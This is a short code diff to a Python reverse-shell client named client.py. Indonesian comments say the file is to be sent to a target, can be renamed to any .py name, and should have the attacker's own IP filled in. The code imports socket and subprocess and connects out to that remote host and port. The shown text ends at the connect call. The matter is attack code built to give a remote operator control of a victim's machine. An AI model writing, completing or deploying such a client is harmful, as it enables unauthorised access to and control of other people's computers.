@@ -1,8 +1,10 @@
+#client.py adalah sebuah source code python yang nanti nya di kirimkan ke target
+#tidak harus dengan namanya client.py,terserah mau di ganti nama apa aja yang penting berformat (.py)
 import socket
 import subprocess
 
-REMOTE_HOST = '127.0.0.1' # '192.168.43.82'
-REMOTE_PORT = 8081 # 2222
+REMOTE_HOST = 'taruh ip anda di sini' # '192.168.43.82'
+REMOTE_PORT = 8081 # 2222 # untuk portnya terserah
 client = socket.socket()
 print("\033[1;92m[-] Connection Initiating...")
 client.connect((REMOTE_HOST, REMOTE_PORT))
